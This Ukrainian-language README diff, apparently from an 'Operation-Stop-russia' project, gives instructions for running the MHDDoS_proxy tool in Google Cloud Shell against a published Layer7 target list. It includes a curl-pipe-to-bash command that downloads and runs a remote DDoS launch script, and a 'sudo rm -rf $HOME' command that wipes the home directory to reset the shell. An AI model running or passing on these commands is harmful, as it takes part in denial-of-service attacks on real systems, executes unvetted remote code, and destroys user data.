@@ -11,7 +11,7 @@
 :exclamation:• У [Google Cloud Shell](https://shell.cloud.google.com/?fromcloudshell=true&show=terminal) в налаштуваннях можна вимкнути статистику використання.    
 • **Для скидання Cloud Shell** - Видаліть усі файли з домашнього каталогу, команда: `sudo rm -rf $HOME`, далі - у меню Cloud Shell клацніть значок меню з трьома крапками, а потім натисніть "Restart" *(Буде надано нову віртуальну машину, а домашній каталог буде відновлено до стану за замовчуванням)*
 #
-### Стабільні сеанси 
+### Стабільні сеанси (*90%*)
 :white_check_mark:**Команда для встановлення та запуску MHDDoS_proxy (по [Layer7](https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst)):**
 ```
 curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
